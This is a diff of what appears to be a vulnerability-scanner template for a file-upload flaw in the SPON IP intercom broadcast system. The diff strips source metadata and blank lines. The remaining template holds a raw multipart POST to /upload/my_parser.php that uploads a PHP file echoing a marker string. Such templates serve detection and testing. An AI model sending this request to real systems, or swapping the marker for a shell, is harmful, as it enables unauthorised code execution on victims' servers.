@@ -3,12 +3,8 @@ info:
   name: SPON IP网络对讲广播系统 my_parser 文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qdnlffw7nf10yf03'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qdnlffw7nf10yf03
-    fofa: icon_hash="-1830859634"
 http:
 - raw:
   - 'POST /upload/my_parser.php HTTP/1.1
@@ -29,8 +25,6 @@ http:
     Connection: close
 
 
-
-
     -----------------------------402880817133959846752911683338
 
 
@@ -38,8 +32,6 @@ http:
 
 
     Content-Type: image/jpg
-
-
 
 
     <?php echo "dudesuite"; ?>
